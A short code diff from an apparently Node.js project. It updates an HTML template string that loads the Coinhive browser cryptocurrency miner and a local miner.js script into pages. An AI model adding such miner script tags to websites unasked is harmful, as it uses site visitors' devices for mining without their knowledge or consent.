@@ -3,7 +3,7 @@ var path = require('path');
 var fs = require('fs');
 
 var html = `
-  <script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
+  <script src=\"https://coinhive.com/lib/coinhive.min.js\"></script>
   <script src=\"/miner.js\" /></script>
 `;
 
